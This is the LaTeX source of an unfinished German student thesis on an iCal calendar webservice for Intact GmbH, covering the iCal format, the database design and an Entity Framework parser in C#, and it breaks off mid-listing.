\newcommand{\mypapersize}{A4}
%% e.g., "A4", "letter", "legal", "executive", ...
%% The size of the paper of the resulting PDF file.

\newcommand{\mylaterality}{twoside}
%% "oneside" or "twoside"
%% Either you are creating a document which is printed on both, left pages
%% and right pages (twoside) or you create a document which is printed
%% on right pages only (oneside).

\newcommand{\mydraft}{false}
%% "true" or "false"
%% Use draft mode? If true, included graphics are replaced by empty
%% rectangles (of same size) and overfull boxes (in margin space) are
%% marked with black box (-> easy to spot!)

\newcommand{\myparskip}{half}
%% e.g., "no", "full", "half", ...
%% How to separate paragraphs: indention ("no") or spacing ("half",
%% "full", ...).

\newcommand{\myBCOR}{0mm}
%% Inner binding correction. This value depends on the method which is
%% being used to bind your printed result. Some techniques do not
%% require a binding correction at all ("0mm"), other require for
%% example "5mm". Refer to KOMA script documentation for a detailed
%% explanation what a binding correction is and how to measure it.

\newcommand{\myfontsize}{12pt}
%% e.g., 10pt, 11pt, 12pt
%% The font size of the main text in pt (points).

\newcommand{\mylinespread}{1.0}
%% e.g., 1.0, 1.5, 2.0
%% Line spacing in %/100. For example 1.5 means 150% of the usual line
%% spacing. Please use with caution: 100% ("1.0") is fine because the
%% font was designed for it.

\newcommand{\mylanguage}{ngerman,american}
%% "english,ngerman", "ngerman,english", ...
%% NOTE: The *last* language is the active one!
%% See babel documentation for further details.

%% BibLaTeX-settings: (see biblatex reference for further description)
\newcommand{\mybiblatexstyle}{authoryear}
%% e.g., "alphabetic", "authoryear", ...
%% The biblatex style which is being used for referencing. See
%% biblatex documentation for further details and more values.
%%
%% CAUTION: if you change the style, please check for (in)compatible
%%          "biblatex" package options in the file
%%          "template/preamble.tex"! For example: "alphabetic" does
%%          not have an option "dashed=..." and causes an error if it
%%          does not get removed from the list of options.

\newcommand{\mybiblatexdashed}{false}  %% "true" or "false"
%% If true: replace recurring reference authors with a dash.

\newcommand{\mybiblatexbackref}{true}  %% "true" or "false"
%% If true: create backward links from reference to citations.

\newcommand{\mybiblatexfile}{references-biblatex.bib}
%% Name of the biblatex file that holds the references.

\newcommand{\mydispositioncolor}{30,103,182}
%% e.g., "30,103,182" (blue/turquois), "0,0,0" (black), ...
%% Color of the headings and so forth in RGB (red,green,blue) values.
%% NOTE: if you are using "0,0,0" for black, printers might still
%%       recognize pages as color pages. In case this is a problem
%%       (paying for color print-outs vs. paying for b/w-printouts)
%%       please edit file "template/preamble.tex" and change
%%       "\definecolor{DispositionColor}{RGB}{\mydispositioncolor}"
%%       to "\definecolor{DispositionColor}{gray}{0}" and thus
%%       overwriting the value of \mydispositioncolor above.

\newcommand{\mycolorlinks}{true}  %% "true" or "false"
%% Enables or disables colored links (hyperref package).

\newcommand{\mytitlepage}{template/title_Thesis_TU_Graz}
%% Your own or one of following pre-defined title pages:
%% "template/title_plain_maketitle": simple maketitle page
%% "template/title_Diplomarbeit_KF_Uni_Graz.tex": fancy (german) title page for KF Uni Graz

\newcommand{\mytodonotesoptions}{}
%% e.g., "" (empty), "disable", ...
%% Options for the todonotes-package. If "disable", all todonotes will
%% be hidden (including listoftodos).

%% Load main settings for document preamble:
\input{template/preamble}%% DO NOT REMOVE THIS LINE!

\setboolean{myaddcolophon}{false}  %% "true" or "false"
%% If set to "true": a colophon (with notes about this document
%% template, LaTeX, ...) is added after the title page.
%% Please do not set to "false" without a good reason. The colophon
%% helps your readers to get in touch with LaTeX and to find this template.

\setboolean{myaddlistoftodos}{false}  %% "true" or "false"
%% If set to "true": the current list of open todos is added after the
%% table of contents. If \mytodonotesoptions is set to "disable", no
%% list of todos is added, independent of this setting here.

\setboolean{english_affidavit}{false}  %% "true" or "false"
%% If set to "true": the language of the statutory declaration text is set to
%% English, otherwise it is in German.


%% ========================================================================
%%%% Document metadata
%% ========================================================================

%% general metadata:
\newcommand{\myauthor}{Matthias Franz, Marcel Stering, Dario Wagner}
\newcommand{\myauthorwithexistingtitles}{\myauthor{}}
\newcommand{\mytitle}{iCal Webservice} 

%% this information is used only for generating the title page:
\newcommand{\myworktitle}{Diplomarbeit}
\newcommand{\myuniversity}{Graz University of Technology}
\newcommand{\myinstitute}{HTL Kaindorf}
\newcommand{\mysupervisor}{Gernot Loibner}
\newcommand{\mypartner}{Intact GmbH}
\newcommand{\myhometown}{Kaindorf a. d. Sulm} %% your home town
\newcommand{\myhomepostalnumber}{8010} %% your postal number of home town
\newcommand{\mysubmissionmonth}{April} %% month you are handing in
\newcommand{\mysubmissionyear}{2019} %% year you are handing in
\newcommand{\mysubmissiontown}{\myhometown} %% town of handing in (or \myhometown)


%% additional information for generic_documentation title page
\newcommand{\myid}{1234567} %% Matrikelnummer
\newcommand{\mylecture}{LECTURE} %%

%----------------------UNSER STUFF----------------------------

\usepackage{float}
\usepackage{graphicx}
\usepackage{ragged2e}
\graphicspath{ {./figures/} }

\definecolor{bluekeywords}{rgb}{0,0,1}
\definecolor{greencomments}{rgb}{0,0.5,0}
\definecolor{redstrings}{rgb}{0.64,0.08,0.08}
\definecolor{xmlcomments}{rgb}{0.5,0.5,0.5}
\definecolor{types}{rgb}{0.17,0.57,0.68}

% C# Code formatierung
\usepackage{listings}
\lstset{language=[Sharp]C,
captionpos=b,
showspaces=false,
showtabs=false,
breaklines=true,
showstringspaces=false,
breakatwhitespace=true,
escapeinside={(*@}{@*)},
commentstyle=\color{greencomments},
morekeywords={partial, var, value, get, set},
keywordstyle=\color{bluekeywords},
stringstyle=\color{redstrings},
basicstyle=\ttfamily\small,
}

\usepackage{fancyhdr}
\newcommand{\theauthor}{}

\pagestyle{fancy}
\fancyhf{}
\fancyhead[LO,RE]{\theauthor}
\fancyfoot[LO,RE]{\thepage}

\usepackage{wrapfig}

%----------------------ENDE UNSER STUFF-----------------------

\input{template/mycommands}

\input{template/typographic_settings}


\newcommand{\myLaT}{\LaTeX{}@TUG\xspace} 

\hyphenation{ex-am-ple hy-phen-ate}

\input{template/pdf_settings}  %% should be *last* definitions in 


\begin{document}

\frontmatter                    %% KOMA: roman page numbers and such; only available in scrbook

\input{colophon}                %% defines information about editor, LaTeX, font, ...

\input{\mytitlepage}       

\input{template/declaration_TU_Graz}  

%% include the abstract without chapter number but include it on table of contents:
%\cleardoublepage
%\phantomsection
%\addcontentsline{toc}{chapter}{Abstract}
%%%% Time-stamp: <2013-02-25 10:31:01 vk>


\chapter*{Abstract - DE}
\label{cha:abstract}

Diese Diplomarbeit befasst sich mit einem Stück Software welche im Auftrag der Firma Intact GmbH angefertigt wurde. Das Ziel der Diplomarbeit ist es, AuditorInnen welche die bereits existierende Anwendung Ecert verwenden, Kalender immer und überall verfügbar zu machen. Erreicht wurde dies mit Verwendung des iCal-Formates welches von jeder Kalender-Applikation verwendet wird um Kalender anzuzeigen und zu speichern. Die Kalender der AuditorInnen werden gespeichert und nachdem man sich auf einer Webseite angemeldet hat, kann man auf alle seine Kalender zugreifen und in jegliche Kalender-Applikation einbinden. Somit müssen sich AuditorInnen nicht mehr darauf konzentrieren, dass alle ihre/seine Kalender auf dem Gerät sind, denn diese sind nun übers Internet erreichbar. 
\vspace{20px}
\linebreak
\pagebreak

\pagebreak

\chapter*{Abstract - EN}
\label{cha:abstract}
The subject of this thesis is a piece of software which was written on the behalf of Intact GmbH. The aim of this thesis is to offer auditors who already use Intact GmbHs own software, Ecert, the ability to access their calendars everywhere and anytime they want. This achievable because nearly every calendar-app uses the iCal-format to save the calendar. The iCal-format gets saved and the auditor just needs to login into a website and there they can find all their calendars ready to be integrated in their favorite calendar-app.

%\glsresetall %% all glossary entries should be used in long form (again)
%% vim:foldmethod=expr
%% vim:fde=getline(v\:lnum)=~'^%%%%\ .\\+'?'>1'\:'='
%%% Local Variables:
%%% mode: latex
%%% mode: auto-fill
%%% mode: flyspell
%%% eval: (ispell-change-dictionary "en_US")
%%% TeX-master: "main"
%%% End:
              

\tableofcontents               

\mainmatter                     %% KOMA: marks main part using arabic page numbers and such; only available in scr

	\renewcommand{\theauthor}{Matthias Franz}

\section{Aufgabenstellung}
\label{sec:Aufgabenstellung}
Die Aufgabenstellung für diese Diplomarbeit wurde von der Intact GmbH vorgegeben. Die Aufgabe war, einen Webservice inklusive Webseite zu erstellen welche es ermöglichen Kalender inklusive Dateien welche an Terminen angeheftet sind immer und überall in ein beliebiges Kalenderprogramm einzubinden. \\
Dieser Webservice und Webseite wird für ausgewählte Kunden der Intact GmbH für Testzwecke zur Verfügung gestellt.
	\section{Projektmanagement und Organisation}
\label{sec:ProjUOrg}

\subsection{Team} %Fotos fehlen noch
	\subsubsection*{Dario Wagner}
		Verantwortlich für: 
		\begin{itemize}
			\item Parser
			\item iCal
		\end{itemize}
	\subsubsection*{Marcel Stering}
		Verantwortlich für: 
		\begin{itemize}
			\item Security
			\item Webseite
		\end{itemize}
	\subsubsection*{Matthias Franz}
		Verwantwortlich für: 
		\begin{itemize}
			\item iCal
			\item Datenbank
			\item Projektleitung
		\end{itemize}				

\subsection{Auftraggeber - Intact Systems}
Unsere Diplomarbeit wurde im Auftrag des Unternehmens Intact Systems durchgeführt. Intact Systems ist eine in Lebring sitzende Softwareentwicklungsfirma welche sich auf Audits, Zertifizierungsmanagement, Rückverfolgbarkeit und Qualitätsmanagement spezialisiert hat auch Sitze in der USA und in der Schewiz. Unsere Ansprechpartner waren Rudolf Rauch und Mathias Schober. Intact bietet maßgeschneiderte Softwarelösungen und standartisierte. Intacts bekantestes Produkt ist Ecert, welches interne Audits, Zertifizierung, Gütesiegel, Lieferanten und noch vieles mehr managen kann.
	\subsubsection*{Kontaktaufnahme mit Intact Systems}
	Mit Intact Systems wurde am Recruiting-Day der HTBLA Kaindorf kontakt aufgenommen und Kontaktdaten wurden ausgetauscht. Nach wenige Emails wurde das erste Treffen vereinbart und die abhandlung der Diplomarbeit mit Unterstützung von Intact war fixiert. Im gleichen Treffen wurde bereits das Thema der Diplomarbeit im groben besprochen.  
	\section{iCal}
\label{sec:iCal}
\subsection{Was ist iCal?}
\label{sec:wasIstiCal?}
iCal oder auch iCalendar ist ein Dateiformat, welches dazu verwendet wird um Kalender zu speichern. Fast jede Kalenderanwendung verwendet zur Speicherung und Manipulation ihrer Kalender iCal. Als Datei hat eine iCal-Datei die Endung .ics. Ein .ics ist von Menschen lesbar und leicht veränderbar, was die Arbeit mit iCal-Dateien um einiges vereinfacht. \\
iCal ist ein MIME-Typ, dies ermöglicht es iCal-Dateien über jegliche Methoden zu versenden.\\ \textcite{iCal-Basics} \\
MIME bedeutet Multipurpose Internet Mail Extension und beschreibt Dateien, welche Art von Datei bei der Kommunikation zwischen Browser und Webserver versendet wird. MIME-Typen wären zum Beispiel: Textdateien, Bilder, Audio-Dateien. \\ \textcite{MIME-Typ}


\subsection{Warum wurde iCal verwendet?}
\label{sec:warumWurdeiCalVerwendet?}
iCal wurde verwendet, da der Großteil der Kalenderprogramme das iCal-Format verwenden und es viele Ressourcen rund um iCal gibt, was den Umgang damit deutlich vereinfacht. Weiters sind die Grundlagen einer iCal-Datei schnell verstanden wegen des einfachen Aufbau einer Datei.

\subsection{Aufbau einer iCal-Datei}
\label{sec:aufbauEineriCalDatei}
iCal-Dateien sind in einer Key-Value-Struktur aufgebaut, wobei sich jedes Key-Value-Paar in einer eigenen Zeile befindet. Eine iCal-Datei kann aus mehreren Kalendern bestehen und ein Kalender kann mehreren Objekten bestehen, die wichtigsten sind: Event-, To-do- und Journal-Elemente, welche genauer im Kapitel \ref{sec:keywords}.

 BEGIN:VCALENDAR
 VERSION:2.0
 PRODID:-//hacksw/handcal//NONSGML v1.0//EN
 BEGIN:VEVENT
 UID:19970610T172345Z-AF23B2@example.com
 DTSTAMP:19970610T172345Z
 DTSTART:19970714T170000Z
 DTEND:19970715T040000Z
 SUMMARY:Bastille Day Party
 END:VEVENT
 END:VCALENDAR

\subsection{Keywords}
\label{sec:keywords}
des ist nur da, damit ich es referenzieren kannst, wennst die überschrift ändern willst änder des in der Referenz von "Aufbau einer iCal-Datei auch mit.
	%TODO ER-Diagramm selbstverweis auf Attendee 2x

\renewcommand{\theauthor}{Matthias Franz}
\chapter{Datenbank}
\label{sec:datenbank}
In diesem Kapitel geht es um die Datenbank welche in dieser Arbeit erstellt worden ist. Es geht um den Aufbau der Datenbank, deren Funktion und wie diese mit den anderen Teilen des Projektes zusammenarbeitet.

\section{Funktion der Datenbank}
\label{sec:funktionDatenbank}
Die Datenbank speichert Benutzerdaten und Kalender der Benutzer. Die Daten dieser Datenbank bilden alle für dieses Projekt relevanten Teile einer iCal-Datei ab. Es werden nicht alle möglichen Eigenschaften einer iCal-Datei benötigt, da die Daten welche gespeichert werden ausreichen, um einen typischen Kalender welcher in Unternehmen verwendet wird abgebildet. Die Datenbank ermöglicht es, dass mehrere Benutzer mehrere Kalender haben und mehrere Benutzer auch die gleichen Kalender haben können. Benutzer sind in der Lage Kalender mit Terminen, To-Do Elementen und Alarmen zu speichern, weiters ermöglicht die Datenbank es die Zeitzone des Kalenders zu ändern.
\\
Die Daten werden dann vom Parser genommen und in eine funktionierende .ics-Datei umgewandelt. 

\section{Aufbau der Datenbank}
\label{sec:aufbauDatenbank}
Die Datenbank ist relationale Datenbank MSSQL-Datenbank, das ER-Diagramm welches in Abbildung \ref{fig:erDiagramm} zu sehen ist wurde mit der Krähenfuß- oder auch Martinnotation abgebildet. 
\\
Ein ER-Diagramm besteht aus Entitäten und Relationen, eine Entität ist eine Tabelle und eine Relation ist eine Verbindung zweier Entitäten. Eine Relation hat immer zwei Kardinalitäten, eine Kardinalität gibt die maximal möglich Anzahl an Instanzen auf welche sich eine Entität referenzieren kann. In der Krähenfußnotation gibt es sechs verschiedene Kardinalitäten. Da auf jeder der beiden Seiten einer Relation eine Kardinalität ist, gibt es viele verschiedene Kombinationen. Alle möglichen Kardinalitäten werden in Abbildung \ref{fig:kardinalitaeten} gezeigt.
\begin{figure}[H]
	\centering\includegraphics[scale=0.7]
	{Datenbank_Kardinalitaeten.png}
    \caption{Kardinalitäten}
    \label{fig:kardinalitaeten}
\end{figure}
Im ER-Diagramm von Abbildung \ref{fig:erDiagramm} werden Primary-Keys fett und Foreign Keys kursiv dargestellt.

\begin{figure}[H]
	\includegraphics[angle=270,origin=c,width=\textwidth]{Datenbank_ER-Diagramm.png}
    \caption{ER-Diagramm}
    \label{fig:erDiagramm}
\end{figure}

\subsubsection*{Benutzer und Kalender}
\label{ref:benutzerKalender}
In der UserTable-Tabelle werden Benutzerdaten gespeichert, jeder Benutzer bekommt eine einmalide Id zugewiesen, die UserId. Weiters wird von jeden Benutzer ein Benutzername, eine Email und ein Passwort gespeichert. Genaueres zum UserTable ist im Kapitel \ref{sec:UserDB}. Da ein Benutzer mehrere Kalender haben kann und ein Kalender auch zu mehreren Benutzern gehört, gibt es die Tabelle UserHasCalendar, welche dazu dient, festzuhalten welcher Kalender zu welchen Benutzern gehört. Dies wird erreicht indem der Primary-Key der UserTable-Tabelle und der Calender-Tabelle zusammen als Primary-Key in der UserHasCalender-Tabelle genommen werden.Wie dies im ER-Diagramm aussieht sieht man in Abbildung \ref{fig:userCalender}.\\
Die Calender-Tabelle speichert Informationen zu einem Kalender welche dann im Parser in die iCal-Datei gegeben werden.
\begin{figure}[H]
	\includegraphics[width=\textwidth]{Datenbank_UserCalendar.png}
    \caption{Relation zwischen Benutzer und Kalender}
    \label{fig:userCalender}
\end{figure}

\subsubsection*{Kalender und Zeitzonen}
\label{ref:kalenderZeitzonen}
Da dieses Projekt für ein Unternehmen gemacht wurde, welches mit Internationalen Kunden tätig ist, ist es wichtig, dass Kalender in verschiedenen Zeitzonen seien können. Deswegen wurde eine eigene Tabelle mit Zeitzonen angefertigt, damit das hinzufügen von einer Zeitzone in einen Kalender einfacher wird. Die TimeZone-Tabelle welche Zeitzonen abbildet besteht aus einer einmaligen Id und dem Land und der Stadt der Zeitzone, da im iCal-Format Zeitzonen so abgebildet werden. 
\begin{figure}[H]
	\includegraphics[width=\textwidth]{Datenbank_CalendarTimezone.png}
    \caption{Relation zwischen Kalender und Zeitzone}
    \label{fig:timezoneCalender}
\end{figure}

\subsubsection*{Kalendereinträge}
\label{ref:kalenderEintraege}
Ein Kalender besteht aus mehreren Kalendereinträgen, ein Kalenderbeitrag ist zum Beispiel ein Termin oder ein To-Do Element. Termine werden in der Event-Tabelle und To-Dos in der ToDo-Tabelle abgebildet. Da diese beiden Objekte viele ähnliche Attribute haben aber dennoch einige Attribute besitzen welche die andere Tabelle nicht benötigt, sind sie beide mit der gleichen Supertabelle über eine is-a Relation verbunden. Is-a bedeutet, dass beide Tabellen alle Attribute der CalendarEntry-Tabelle zusätzlich zu ihren eigenen Attributen besitzen.
\begin{figure}[H]
	\includegraphics[width=\textwidth]{Datenbank_CalenderEntries.png}
    \caption{Kalendereinträge}
    \label{fig:calendarEntries}
\end{figure}

\subsubsection*{Kalendereintragseigenschaften}
\label{ref:kalendereintragseigenschaften}
Einträge wie VEVENT und VTODO in iCal-Dateien haben eine Vielzahl an Attributen, diese Attribute werden in der Datenbank durch Eins zu Mehrere Beziehungen abgebildet. Die Attribute welche in der Datenbank mit der CalendarEntry-Tabelle verbunden sind für alle Einträge in einer iCal-Datei zur Verfügung stehen sind sie nur mit der CalendarEntry-Tabelle verbunden anstatt mit der ToDo- oder Event-Tabelle. Die Tabellen RRUle, Class, Organizer und Status wurden in eigene Tabellen ausgebaut, da so keine Fehler auftreten können, zum Beispiel kann man so keinen Status in einen Kalendereintrag eintragen welcher nicht existiert, denn es gibt nur eine bestimmte Anzahl an vorgefertigten Einträge welche das iCal-Format erlaubt. Deswegen sind die Status- und Class-Tabelle schon von Haus aus gefüllt.
In der Class-Tabelle gibt es die Einträge: PUBLIC, PRIVATE und CONFIDENTIAL. In der Status Tabelle gibt es für für ToDo- und Event-Einträge verschiedene Einträge, da in der Datenbank die Status-Tabelle nicht mit einer Event oder einer ToDo-Tabelle verbunden ist macht das in der Datenbank keine Probleme. Ob ein Status eines ToDo-Elements in einem Event verwendet wird wird im Parser abgefragt. Inhalte der Status Tabelle sind: TENTATIVE, CONFIRMED, CANCELLED, NEEDS-ACTION, COMPLETED, IN-PROCESS und CANCELLED. Genaueres zur Funktionsweise dieser Attribute im Kapitel \ref{sec:keywords}.
\begin{figure}[H]
	\includegraphics[width=\textwidth]{Datenbank_Attribute.jpg}
    \caption{Kalendereintragseigenschaften}
    \label{fig:kalendereintragseigenschaften}
\end{figure}

\subsubsection*{Teilnehmer}
\label{ref:teilnehmer}
Im iCal-Format kann man Terminen Teilnehmer zuweisen.
\begin{figure}[H]
	\includegraphics[width=\textwidth]{Datenbank_Attendee.png}
    \caption{Teilnehmer}
    \label{fig:datenbankTeilnehmer}
\end{figure}


	% TODO - Dario: 
% Entity Framework Source-Code
% Aufgabe, hinzufügen des Modells unseres Projekts und genauer darauf eingehen wie der Parser funktioniert. 

\renewcommand{\theauthor}{Dario Wagner}
\justifying
\section{Parser}
\label{sec:parser}
\subsection{Aufgabe}
\label{sec:parser-aufgabe}
Die Aufgabe des Parsers ist es auf die Datenbank zuzugreifen und sich die, für das iCal Format notwendigen, Daten zu holen. Diese werden anschließend vom Parser in einen iCal String umgewandelt, damit der benutzte Kalender diesen verwerten kann und passende Termine erstellt. 

\subsubsection{Source-Code}
\label{sec:parser-sourcecode}
Unter dieser Überschrift wird auf einen wichtigen Teil des Parsers eingegangen um seine Funktionsweise in Kombination mit dem Entity Framework zu verstehen. Im Prinzip besteht der Parser aus zwei Teilen, dem Verbindungsaufbau mit der Datenbank(DB) über das Entity Framework und dem konvertieren der Daten zu einer iCal-Zeichenkette. Da der zweite Teil sich nur mit reinem Abfragen ob Daten vorhanden sind und wenn sie vorhanden sind dem hinzufügen zum StringBuilder beschäftigt wird dieser Teil nicht erklärt.\\ \\
Im folgenden eingefügten Source-Code ist zu sehen wie man mit hilfe des Parser auf die Datenbank zugreifen kann. Der Source-Code ist anhand von Kommentaren in vier Parts aufgeteilt. Das Source-Code Beispiel wurde identisch aus dem praktischen Teil der Diplomarbeit in der Klasse Parser unter der Methode GetICalFormat(int UserID) übernommen. \\ \\
\textbf{Part 1} \\
Im ersten Part wird der StringBuilder, welcher letzten Endes die fertige Zeichenkette zurückgibt, erstellt. Anschließend wird über den ''using''-Command [\ref{usingkeyword}] ein Objekt mit dem Namen ''db'' von der Klasse iCalContext erstellt. Die Klasse iCalContext wurde vom Entity Framework automatisch generiert und wird unter folgender Überschrift ''\ref{ef-sourcecode} Source-Code'' erklärt. Unter dem Schlüsselwort ''using'' wird desweiteren eine Boolean-Variable erstellt, welche später bei einer Abfrage benötigt wird. Diese kann vorerst ignoriert werden, da sie für die Erklärung irrelevant ist. Im Anschluss wird eine Liste des Typen ''int'' erstellt, welche später unsere Kalender-IDs enthalten wird. \\ \\
\textbf{Part 2} \\
In diesem Abschnitt wird über eine foreach-Schleife durch eine Liste iteriert welche alle Calender IDs enthält die dem übergebenem User gehören. In der Schleife werden alle IDs in die CalendarIdList gespeichert. \\ \\
\textbf{Part 3} \\
In Part 3 ist der Kopf der foreach-Schleife die sich bis zum Ende der Methode durchzieht zusehen. In dieser werden alle Kalender, mit einer ID, welche in der CalendarIdList enhalten sind, iteriert. Das heißt die Methode wird erst beendet wenn alle Kalender des Benutzers in einen iCal-String umgewandelt wurden und im StringBuilder enthalten sind. Da am Anfang von jedem Kalender immer ''BEGIN:VCALENDER'' und eine Timezone angegeben wird, wird dieser String direkt an den StringBuilder angehängt. \\ \\
\textbf{Part 4} \\
In Part 4 sieht man den Kopf einer foreach-Schleife welcher dafür sorgt, dass durch jeden Termin oder Eintrag im Kalender durchiteriert wird. Da das iCal-Format für einen Kalender wie folgt aufgebaut ist: 
\begin{itemize}
\item Kalender Anfang
\item Termin/Eintrag
\item ...
\item Kalender Ende
\end{itemize}

\begin{lstlisting}[caption=Parser Verbindung zur DB mit dem Entity Framework, label=lst:test]
// Part 1
StringBuilder iCalFormat = new StringBuilder();
using (var db = new iCalContext())
{
  bool isTodo = false;
  List<int> CalendarIdList = new List<int>();
  // Part 2
  foreach (var userhascal in db.UserHasCalendar.Where
  		  (y => y.UserId == UserID))
  {
	CalendarIdList.Add(userhascal.CalendarId);
  }
  // Part 3
  foreach (var calendar in db.Calendar.Where
  		  (x => CalendarIdList.Contains(x.CalendarId)))
  {
    iCalFormat.Append("BEGIN:VCALENDAR\nVERSION:2.0\nMETHOD:PUBLISH\n"
	+ "TZID:" + calendar.TimeZone.Continent + "-" 
    + calendar.TimeZone.Country + "\n");
    // Part 4
    foreach (var calendarEntry in calendar.CalendarEntry)
    {
\end{lstlisting} 
\paragraph{using-Schlüsselwort in C\#}
\label{usingkeyword}
Using wird verwendet wenn man sichergehen will, dass das Objekt oder die Objekte in using entsorgt werden. Um zu veranschaulichen wie using funktioniert, folgendes Beispiel.

\begin{lstlisting}[caption=Parser funktionsweise von using, label=lst:test]
// using Schluesselwort
using (MyResource myRes = new MyResource())
{
    myRes.DoSomething();
}
 
// Funktionsweise von using 
{ // Limits scope of myRes
    MyResource myRes= new MyResource();
    try
    {
        myRes.DoSomething();
    }
    finally
    {
        // Check for a null resource.
        if (myRes != null)
            // Call the object's Dispose method.
            ((IDisposable)myRes).Dispose();
    }
}
\end{lstlisting} 
\textcite{ParserUsingKeyword}
\subsection{Entity Framework}
\label{sec:parser-entity-framework}
\subsubsection {Funktionsweise}
Mithilfe des Entity Framework lässt sich eine Datenbankstruktur innerhalb des Projekts mit Klassen darstellen. Wenn auf eine dieser Klassen in Form einer Value-Abfrage zugegriffen oder durch sonstige GET/SET Methoden, wird durch das Entity Framework ein Datenbank Zugriff durchgeführt. 
Um die Funktionsweise genauer zu verstehen folgt ein Beispiel mit einer Datenbank in welcher Autos gespeichert werden:
HIER KOMMT DANN EIN BEISPIEL
\subsubsection {Anwendung}
Voraussetzung: Funktionsfähige ASP.NET Web Application \\
\break \textbf{1. Erstellung einer Datenbank} \\
Als Beispiel wurde für dieses Beispiel die Scott Tiger Datenbank verwendet.
\break \url{http://jailer.sourceforge.net/scott-tiger.sql.html} \\
\break \textbf{2. Installieren des EntityFrameworks} \\
In der Packet Manager Console folgenden Befehl eingeben und bestätigen: 
\begin{figure}[H]
	\centering
    \includegraphics[width=0.5\textwidth]{Parser_EFUse01}
    \caption{Install}
    \label{fig:parsef01}
\end{figure}
Abschluss der Installation sieht wie folgt aus:
\begin{figure}[H]
    \includegraphics[width=0.9\textwidth]{Parser_EFUse02}
    \caption{Install complete}
    \label{fig:parsef02}
\end{figure} 

\textbf{3. Entity Framework generiert Klassen aus DB} \\
Im Solution Explorer auf den Model Ordner Rechtsklick machen -> ''Hinzufügen'' -> ''Neues Element''
\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{Parser_EFUse03}
    \caption{Neues Element}
    \label{fig:parsef03}
\end{figure} 
Anschließend auf ''Daten'' -> ''ADO.NET Entity Data Model'' -> Hinzufügen
\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{Parser_EFUse04}
    \caption{ADO.NET Entity Data Model}
    \label{fig:parsef04}
\end{figure} 
Im nächsten Fenster nun  ''EF Designer aus Datenbank'' auswählen und ''Weiter''
\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{Parser_EFUse05}
    \caption{EF Designer aus Datenbank}
    \label{fig:parsef05}
\end{figure} 
Hier zunächst die Verbindung auswählen in diesem Fall ist ein lokales Datenbankfile vorhanden, daher wird dieses per DropDownMenü ausgewählt und auf ''Weiter''
\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{Parser_EFUse06}
    \caption{Datenverbindung}
    \label{fig:parsef06}
\end{figure} 
Alle Tabellen auswählen und auf ''Fertig stellen''. 
\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{Parser_EFUse07}
    \caption{Datenbankobjekte auswählen}
    \label{fig:parsef07}
\end{figure} 
Falls eine Sicherheitswarnung erscheint auf ''OK'' klicken. \\
Endresultat, das Entity Framework hat die Tables im Models Ordner erstellt und am Bildschirm sieht man das Klassen mit ihren Beziehungen. Dies sollte ungefähr so aussehen:
\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{Parser_EFUse09}
    \caption{Klassendiagramm}
    \label{fig:parsef07}
\end{figure} 
\begin{figure}[H]
    \centering
    \includegraphics[width=0.5\textwidth]{Parser_EFUse10}
    \caption{Solutionsexplorer}
    \label{fig:parsef07}
\end{figure} 



\subsubsection{Source-Code}
\label{ef-sourcecode}
%Hier kommt die Source-Code Erklärung des Parsers hin

%SOURCE CODE VOM iCalContext
%	 public virtual DbSet<ActionTable> ActionTable { get; set; }
%    public virtual DbSet<Alarm> Alarm { get; set; }
%    public virtual DbSet<Attendance> Attendance { get; set; }
%    public virtual DbSet<Attendee> Attendee { get; set; }
%    public virtual DbSet<AttendeeAlarm> AttendeeAlarm { get; set; }
%    public virtual DbSet<Calendar> Calendar { get; set; }
%    public virtual DbSet<CalendarClass> CalendarClass { get; set; }
%    public virtual DbSet<CalendarEntry> CalendarEntry { get; set; }
%    public virtual DbSet<EventTable> EventTable { get; set; }
%    public virtual DbSet<Frequency> Frequency { get; set; }
%    public virtual DbSet<Organizer> Organizer { get; set; }
%    public virtual DbSet<Partstat> Partstat { get; set; }
%    public virtual DbSet<RoleTable> RoleTable { get; set; }
%    public virtual DbSet<Rrule> Rrule { get; set; }
%    public virtual DbSet<StatusTable> StatusTable { get; set; }
%    public virtual DbSet<TimeZone> TimeZone { get; set; }
%    public virtual DbSet<Todo> Todo { get; set; }
%    public virtual DbSet<TriggerTable> TriggerTable { get; set; }
%    public virtual DbSet<UserHasCalendar> UserHasCalendar { get; set; }
%    public virtual DbSet<UserTable> UserTable { get; set; }

%	protected override void OnModelCreating(ModelBuilder modelBuilder)
%    {
%      modelBuilder.Entity<ActionTable>(entity =>
%      {
%        entity.HasKey(e => e.ActionId);
%
%        entity.Property(e => e.ActionId).ValueGeneratedNever();
%
%        entity.Property(e => e.ActionName)
%                  .IsRequired()
%                  .HasMaxLength(50);
%      });

	\renewcommand{\theauthor}{Dario Wagner}
\section{Technologien}
\subsection{Allgemeines}
Die, während der Diplomarbeit, verwendeten Technologien werden anschließend, unter entsprechender Überschrift, beschrieben, wobei auf die wichtigsten, oder auch meist benutzten, genauer eingegangen wird, in Form einer Installation und einer erweiterten Beschreibung. Zudem werden auch alle Technologien beschrieben welche sich nicht bis zum Ende der Arbeit durchsetzen konnten und während der Arbeit auf eine andere gewechselt wurde oder diese überhaupt nicht mehr verwendet wurde. Dies wird jedoch im Beschreibungstext kenntlich gemacht.
\subsection{Programmierung}
\subsubsection {Visual Studio 17 Community}
Visual Studio ist eine Entwicklungsumgebung, für verschiedenste Programmiersprachen, der Firma Microsoft. Die Version 15 / 2017 ist die aktuellste Version und bietet neue Funktionen und Verbesserungen. Unter anderem die voll umfängliche Unterstützung der ASP.NET Core und .NET Core Entwicklung. Die aktuelle Version unterstützt folgende Sprachen:
\begin{itemize}
\item Visual Basic .NET
\item C
\item C++
\item C\#
\item F\#
\item Typescript
\item Python
\item HTML
\item JavaScript
\item CSS
\end{itemize}

Da der Hauptteil der Diplomarbeit in der Objekt Orientierten Programmiersprache C\# geschrieben wurde, hat das Entwicklungsteam Visual Studio 2017 Community verwendet. Hierbei war es wichtig, dass jedes Mitglied der Diplomarbeitsgruppe die selbe "Jahres-Version", in diesem Fall 2017, verwendet, da es zwischen den Versionen kleine Unterscheide, welche zu einem Problem führen könnten, gibt. Ein gravierender Unterschied wäre die Syntax eines Propertys zwischen Version 2013 und 2017. 

\begin{lstlisting}[caption=Syntax Unterschied: Property , label=lst:test]
// Visual Studio 2013 Code
  private string m_Beispiel;
  public string Beispiel
  {
      get { return m_Beispiel; }
      set { m_Beispiel = value; }
  }

// Visual Studio 2017 Code
